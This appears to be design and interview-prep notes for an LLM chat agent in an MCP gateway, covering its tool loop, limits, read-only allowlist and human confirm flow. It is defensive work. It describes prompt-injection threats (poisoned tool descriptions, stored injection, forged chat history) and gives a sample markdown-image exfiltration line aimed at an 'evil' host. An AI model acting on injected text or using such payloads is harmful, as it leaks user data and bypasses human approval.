# Chat agent (phase 6): route, LLM loop, untrusted tools, confirm flow, dashboard Chat page

Files: `services/gateway/src/{api/chat.ts,chat/agent.ts,chat/prompt.ts,chat/pending.ts,chat/llm.ts,chat/errors.ts,chat/types.ts,config.ts,app.ts,gateway.ts}`, `apps/dashboard/src/pages/Chat.tsx`, `charts/gateway/{values.yaml,templates/deployment.yaml}`, `deploy/values-local.yaml`, `scripts/secrets.sh`. ADRs 017 and 018.

## 1. What it is and why

The chat agent lets a logged-in member type "list my products" or "mark order 12 as completed" and an LLM picks tools from the same list `/mcp` exposes. Every tool call goes through the same `Gateway.callTool` (route, call, audit) as an external MCP client, with `source = "chat"` in the audit row, so chat has no back door around routing or logging.

## 2. Request flow

**A read ("list products"):**
1. Browser (`Chat.tsx:75-96`, `api.ts:15-24`): `POST http://app.localtest.me/api/chat`, JSON `{messages:[…history, {role:"user",…}]}`, cookie `session` (same origin, `credentials: same-origin`).
2. Traefik matches host `app.localtest.me`, path prefix `/api`, forwards to Service `gateway`, then the gateway pod (same Ingress as `/mcp`, `charts/gateway/values.yaml:11-13`).
3. Express `/api` router (`api/router.ts`): `requireJsonBody` (415 if not JSON, `:27`) then `express.json({limit:"64kb"})` for `/chat` only (`:29`), then `loadUser` (cookie to Postgres session lookup, `:30`).
4. `chatRoutes` (`api/chat.ts:29`): `requireUser` (401 if no session), 503 if no LLM configured (`:30-33`), zod parse of the body (`:40`), then `agent.run` (`:41`).
5. `ChatAgent.run` (`chat/agent.ts:98-107`): one request per user at a time, else 429 (`:100`). `runTurn` sets a 55 s deadline (`:110`).
6. History is rebuilt and capped (`sanitizeHistory`, `:58-72`). Loop (`:139`): `gateway.listTools()` (`:142`), then `llm(...)` (`:148`) = `POST {LLM_BASE_URL}/chat/completions` with `Authorization: Bearer <key>` (`chat/llm.ts:11-22`). This is the only hop leaving the cluster.
7. The model answers with a `tool_calls` message, e.g. `woo__list_products`. The name is in the read-only set, so `execute` (`:186`) calls `gateway.callTool(user, name, args, "chat")` (`:189`).
8. `Gateway.callTool` (`gateway.ts:34`) splits `woo__list_products` into server `woo` and tool, calls the upstream over MCP Streamable HTTP (`tools/call`) to Service `woo-mcp`, which calls WooCommerce REST, and writes one `audit_log` row in `finally` (`:59`, insert `:65-67`).
9. The result is wrapped in `<tool_output>` (`prompt.ts:66-70`), appended to the conversation, and the loop calls the LLM again. When the model replies with plain text, `finish` returns it (`agent.ts:157`).
10. Response `{reply, messages, toolCalls, pendingToolCall}` (`api/chat.ts:43`). The dashboard stores `messages` as history and draws tool cards and the reply (`Chat.tsx:83-87`).

**A write ("set order 12 completed"):** steps 1-6 same. The model asks for `woo__update_order_status`, which is not on the allowlist, so the loop stops (`agent.ts:171, 177-181`). The server stores `{user, tool, args, toolCallId, messages}` in `PendingStore` and returns `pendingToolCall {id, tool, args}` with no messages. The dashboard shows a card with Confirm/Decline. Click sends a second `POST /api/chat` with `{messages, confirm:{id, approve}}` (`Chat.tsx:104-107`). The server `take`s the stored entry (`agent.ts:118`), runs the stored tool and args (`:122`), then continues the loop so the model can write the final answer.

## 3. The loop and its limits

| Limit | Value | Where | What happens |
|---|---|---|---|
| Steps (LLM calls) per request | 8 | `agent.ts:91, 139, 183` | "I stopped after 8 steps without a final answer." |
| Total time per request | 55 s | `:92, 140-141` | "This took too long, so I stopped." (55 s stays under Traefik's/browser's patience) |
| One LLM call | 20 s, and never past the remaining budget | `:143` (`AbortSignal.any` of two timeouts) | "The model took too long to answer." |
| Tool calls per step | 5 | `:12, 164` | extras answered "not run: too many tool calls in one step" |
| Writes per step | 1 | `:171-174` | extras answered "not run: confirm one write at a time" |
| Deadline before each tool call | every one | `:188` | "not run: out of time". Includes the call right after a confirm. |
| History | last 20 messages, max 100 accepted | `:68`, `api/chat.ts:21` | older cut |
| Body size | 64 KB | `router.ts:29` | 413, the dashboard says "Conversation too long" |
| One request per user | in memory Set | `:98-107` | 429 "chat busy" |

Why the budget is checked in code and not just `parallel_tool_calls:false`: that flag (`llm.ts:14`) is a hint to the provider. The gateway enforces its own cap (`:164`).

## 4. Tools: listing and cleaning

- `listTools()` returns the live merged tool list of all enabled upstreams (`gateway.ts:29`), re-read every step, so a server disabled mid-conversation vanishes.
- `toLlmTools` (`prompt.ts:35-59`) turns MCP tools into OpenAI function definitions. A tool whose schema JSON is over 8 KB is skipped and logged (`:40-43`). The total list is capped at 64 KB, the skipped names logged once (`:46-49`).
- `cleanText` (`:16-18`): collapse whitespace, strip control characters, cut to length. Applied to every `description` and `title`, including nested ones in the schema (`cleanSchema`, `:24-33`). `examples` and `default` are dropped (free text we don't need).
- Why: descriptions come from upstream servers, other people's code. They go into the model's context, so they can carry instructions ("tool poisoning").
- Not cleaned on purpose: enum values and property names (the model needs them to call the tool; only an admin registers upstreams). This is written down in ADR 018.

## 5. Tool results are untrusted

- `wrapToolResult` (`prompt.ts:66-70`): text parts only (`:61-63`), any `<tool_output` or `</tool_output` is escaped to `&lt;…` so a result cannot close the wrapper or fake a new one (`:67`), cut to 8000 chars (`:68`), wrapped as `<tool_output tool="…">`, tool name stripped to `[A-Za-z0-9_-]` (`:69`).
- The system prompt tells the model that everything inside those tags is data and never instructions (`prompt.ts:10-13`).
- **This is a speed bump, not the defence.** A model can still be talked into things. The defence is that writes need a human click (section 6). The demo case is the notes-mcp stored injection (ADR 011/018).
- The user-visible summary of a call is also cleaned and cut to 200 chars (`agent.ts:191`, `SUMMARY_CHARS` `:12`).

## 6. Read-only allowlist and the confirm flow

- The allowlist is `CHAT_READ_ONLY_TOOLS`, from chart values `chat.readOnlyTools` (`charts/gateway/values.yaml:27-35`), joined into one env var (`deployment.yaml:102-103`), parsed into a `Set` (`config.ts:33`), handed to the agent (`app.ts:42`).
- Decision at `agent.ts:168`: name in the set, run now. Anything else (writes, tools on servers added later, anything new) is held. Default for the unknown is "ask".
- We ignore MCP's `readOnlyHint` because the upstream sets it, and the upstream is the untrusted party. We do not ask the LLM either: it is the component that can be fooled. The gateway operator (chart values) decides.
- Names the model invents that aren't in the tool list go straight to `callTool`, which returns an error and audits the attempt (`agent.ts:168`, `gateway.ts:41`). They never become a confirm card.
- **Why the client never supplies the args that run:** `PendingStore.add` (`pending.ts:28-35`) keeps `{userId, tool, args, messages}` on the server under a `crypto.randomUUID()` id. The confirm request carries only `{id, approve}` (`api/chat.ts:22`). `take` (`:38-44`) checks the id exists, belongs to this user (otherwise the same 404 as unknown, so ids can't be probed) and deletes it, so it is single use. On confirm, `agent.ts:118-122` runs the stored values and ignores the `messages` the client sent. So the thing the user sees in the card is exactly the thing that runs, and a user (or a stolen cookie replaying an id) can't swap in different args.
- TTL 5 minutes, max 5 pending per user (oldest dropped), expired swept on every call (`pending.ts:22-35, 56-59`). A new non-confirm message calls `clearUser` (`agent.ts:129`), so an old proposal can't be approved after the conversation moved on.
- Decline: the model is told "user declined" (`agent.ts:124-125`) and writes a final answer.
- `callTool` runs again on confirm, so server enabled/disabled state is re-checked then.
- The confirm card puts Confirm/Decline above the args and cuts displayed args at 2 KB (`Chat.tsx:44-52, 137-148`). Only the display is cut, the server runs the full stored args.

## 7. Client-sent history and its known limit

- The server is stateless between normal turns: the client returns the whole history each time (`Chat.tsx:83, 101`). Simple, no chat table to design, nothing to expire.
- Defences: no `system` role is accepted (`api/chat.ts:13-18`), zod strict objects, size limits, and `sanitizeHistory` rebuilds each message field by field (`agent.ts:58-72`). History must end with a `user` message and starts at a user message (`:69-70`).
- **Known limit:** history is context only, but the client can forge it, e.g. insert a fake `assistant` or `tool` message ("the user already approved deleting everything", or a fake `<tool_output>`). It can steer the model like any prompt text. What it cannot do: run anything without the confirm, because writes still stop at the allowlist and the confirm uses server-held args. A user can only forge their own conversation, and anything the model then calls runs as that same user, who could call it via `/mcp` anyway. Reads are the exposure: a forged history can make the model call allowed read tools. That is within the user's own rights.
- Consequence while a write is pending: the server returns `messages: []` and keeps the turn (`pending.ts:10-11`), so the client's history stays as before until confirm returns the whole turn (`Chat.tsx:82-83`).
- A server-side conversation table would remove the limit; not built (two-week scope). Say so.

## 8. Config, Secret, chart

- Env vars in the gateway Deployment: `LLM_BASE_URL`, `LLM_MODEL` (plain values from `values.yaml:21-24` and `deploy/values-local.yaml:9-12`, Groq + `openai/gpt-oss-120b`), `LLM_API_KEY` from Secret `llm-api` key `api-key` with `optional: true` (`deployment.yaml:91-101`), `CHAT_READ_ONLY_TOOLS` (`:102-103`).
- The key is never in git or in values. `scripts/secrets.sh:101-111` creates Secret `llm-api` only if `LLM_API_KEY` is in your shell, and skips if it exists.
- `optional: true`: without the Secret the pod still starts and chat answers 503, so a missing LLM key never takes the gateway (and `/mcp`) down.
- `config.ts:40-54`: all three of URL, model, key must be set (empty string counts as unset, since the chart always renders the env var). The URL must be `https:` unless `LLM_ALLOW_HTTP=true`, because the bearer key goes to it. A bad URL logs an error and disables chat; the gateway still starts.
- `llm.ts:19`: `redirect: "error"`, so a redirect can't carry the Authorization header somewhere else. `LlmError` keeps only the status, never the body or key (`errors.ts`, `llm.ts:22`). The route logs counts and tool names, never prompts (`api/chat.ts:36-38`).
- Probes and limits are the gateway's general ones (`deployment.yaml:104-128`, resources `values.yaml:40-46`, 256 Mi). Readiness checks the DB only, so an LLM or upstream outage doesn't pull the pod out of its Service. The pending store is in memory, so the gateway must stay at one replica (comment `pending.ts:18`).
- NetworkPolicy: woo-mcp accepts ingress from the gateway only (`charts/woo-mcp/templates/networkpolicy.yaml`). There is no egress policy on the gateway, so it can reach the LLM host (needed) but also anywhere else.

## 9. Dashboard Chat page (`apps/dashboard/src/pages/Chat.tsx`)

- State: `history` (what we send back), `entries` (what is drawn), `pending`, `busy` (`:55-60`).
- `run` (`:75-96`) is the one request function. A `useRef` flag blocks double clicks in the same tick (`:61-62, 76-77`; state would be stale).
- `send` (`:98-102`) appends the user message and posts. `answer` (`:104-107`) posts `{id, approve}` with the old history. Input and Send are disabled while busy or pending (`:161, 171`), so you must answer the card first.
- Everything is rendered as React text nodes: no markdown, no links, no `dangerouslySetInnerHTML` (comment `:32`). Reason: an injected note could otherwise leak data through an image URL like `![x](https://evil/?d=…)`. The system prompt also asks the model for plain text (`prompt.ts:13`).
- Error mapping `:35-42`: 503 not configured, 429 busy, 413 too long, 404 on confirm = expired (and the card is cleared, `:91`).

## 10. The logout 415 bug

- Symptom: clicking "Log out" showed "Logout failed, try again" and the session stayed.
- Cause: `requireJsonBody` (`api/middleware.ts:9-15`) answers 415 to any POST/PATCH/PUT that isn't `application/json`; that is the CSRF defence (a cross-site HTML form can only send form content types, plus `SameSite=Strict`). The dashboard's logout was a bodyless POST, so it had no JSON content type, the gateway returned 415, and `logout()` treats any non-401 error as failure on purpose (`auth.tsx:34-41`: the cookie may still be valid, so stay logged in).
- Fix (`ec4bc15`): `api()` always sends `{}` as JSON for bodyless POST/PATCH/PUT (`api.ts:17-18`). The server side (`api/auth.ts:37-42`) was correct and unchanged. Lesson: the CSRF rule is global, so every write from the SPA needs a JSON body.

## 11. Failure modes

| What breaks | What happens | Where |
|---|---|---|
| No LLM env/Secret | `/api/chat` 503 "chat not configured"; page shows "Chat isn't configured" | `api/chat.ts:30-33`, `Chat.tsx:37` |
| Non-https LLM URL | chat disabled, gateway starts | `config.ts:49-52` |
| LLM 429 | reply "The model is rate limited…" | `agent.ts:152` |
| LLM 5xx / network / bad shape | reply "The model call failed." (detail only in the log) | `:149-154`, `llm.ts:23-25` |
| LLM slow | aborted at 20 s or the remaining budget | `:143, 151` |
| Model loops on tools | 8 steps, then stop message | `:183` |
| Upstream tool fails/down | `callTool` returns an `isError` result (never throws), model reads it, card shows "error" | `gateway.ts:34-58`, `agent.ts:191` |
| Model sends bad JSON args | refused "invalid arguments", model can retry | `:166` |
| Confirm id expired/foreign/reused | 404, card cleared | `pending.ts:41`, `Chat.tsx:91` |
| Gateway restarts | pending lost (memory), user asks again | `pending.ts:18` |
| Double click / two tabs | 429 busy, or ref flag blocks it | `agent.ts:100`, `Chat.tsx:76` |
| Audit insert fails | logged, call result still returned | `gateway.ts:68-70` |

## 12. Security: trusted and not

- Trusted: the session (looked up per request in Postgres), the gateway config (allowlist, upstream list), the server's own system prompt, the stored pending entry.
- Not trusted: LLM output (every name and arg is re-checked: parsed, allowlist, `callTool` routing), upstream descriptions and results (cleaned and wrapped), everything in the client's body except `{id, approve}` semantics and the user's last message.
- Credentials: LLM key only in Secret `llm-api` to env var to the `Authorization` header of one `fetch`. Never sent to the browser, never logged. Upstream credentials stay in the upstreams table, encrypted (ADR 006/013). The browser holds only the HttpOnly `SameSite=Strict` cookie. Anyone who can `kubectl exec` into the gateway can read the key from env.
- Chat acts as the logged-in user: `callTool(user, …)`. Today that means audit attribution; there is no per-user tool permission beyond what `/mcp` also gives that user (check ADR 007/014 if asked).
- Prompts and replies go to the LLM provider (Groq locally). That is the data leaving the cluster. Say it before they ask.

## 13. Ten likely questions

1. **Why does the server, not the client, hold the args for a confirm?** Because the client is the untrusted side: if it sent the args back, a script or a tampered request could confirm a different call than the one the user saw. With only `{id, approve}`, what runs is exactly what was shown, single use, bound to the user (`pending.ts:38-44`, `agent.ts:118-122`).
2. **How do you stop prompt injection from a tool result?** We don't claim to stop the model being fooled. We lower it (wrap and escape, plain-text prompt, cleaned descriptions) and make it not matter for writes: a write can't run without a human click on server-held args. Reads can still be induced; those are within the user's rights and are audited.
3. **Why an allowlist and not MCP `readOnlyHint`?** The hint comes from the upstream, which is the thing we distrust. A hostile server would mark its writes read-only. The allowlist is operator config in the chart, and unknown tools default to "ask".
4. **Why not let the LLM decide when to ask for permission?** It's the component that can be manipulated. Policy lives in code outside the model.
5. **Why is history sent by the client? Why not store conversations?** Stateless server, no table, no cleanup, fits two weeks, and it works across a gateway restart (except pending confirms). Cost: the client can forge its own history (section 7). It can't bypass the confirm. A `conversations` table keyed by user would fix it.
6. **Why in-memory pending, and what about 2 replicas?** One replica by design; a restart loses pending proposals, which just means "ask again". With replicas we'd need a Postgres table or sticky sessions.
7. **How do you bound cost and runtime?** 8 steps, 55 s budget, 20 s per LLM call, 5 tool calls per step, 64 KB body, 20 messages of history, one in-flight request per user. All in `agent.ts`/`router.ts`. Not done: per-user rate limit over time (see weak points).
8. **Why a custom loop over `fetch` and not the Anthropic/OpenAI SDK or LangChain?** One endpoint (`/chat/completions`), ~30 lines, no dependency I can't explain, works with any OpenAI-compatible provider via `LLM_BASE_URL`. The assignment asks for an OpenAI-compatible API.
9. **Why does chat go through `Gateway.callTool` and not straight to woo-mcp?** One path means one place for routing, collision-safe names, errors and audit. Chat can't skip the audit log, and `/mcp` and chat behave the same.
10. **Why render only plain text in the UI?** Markdown images or links in a model reply could exfiltrate data to another host when the browser loads them, and the reply can be influenced by injected text. React text nodes can't do that.

Bonus: *"Why `redirect: "error"` on the LLM fetch?"* so the bearer key can't be forwarded to another host by a redirect. *"What did logout teach you?"* section 10.

## 14. Weak points to be ready to defend

- **No time-based rate limit.** Only one request at a time per user. A user can loop requests all day and spend LLM credits; there is no per-user daily cap or cost meter.
- **History can be forged** (section 7). Defensible, but say it first.
- **Audit gaps:** audit rows record tool, user, outcome, not the args; declined, invalid and capped calls write nothing (ADR 018, parked for phase 7). Ask: "can you prove who changed order 12 to what?" Today: who and when, not the value.
- **Gateway has no egress NetworkPolicy**, so a compromised gateway can call anywhere. The LLM host has to be reachable, which makes a tight policy harder (IP/FQDN not supported by plain NetworkPolicy).
- **Allowlist is a name list.** If an operator puts a write tool there, it runs unasked. Also a new read tool on a new server needs a chart change before it runs without a click (safe default, mildly annoying).
- **No tool permissions per member.** Chat does what that member could do over `/mcp`. If asked "can a read-only member change orders via chat?", the answer depends on whether roles gate tools; check before the interview.
- **Enum values and property names are not cleaned.** Hostile text there could reach the model. Accepted because only admins register upstreams.
- **Pending store is single-replica memory.**
- **Provider sees prompts and data** (order details go to the LLM).
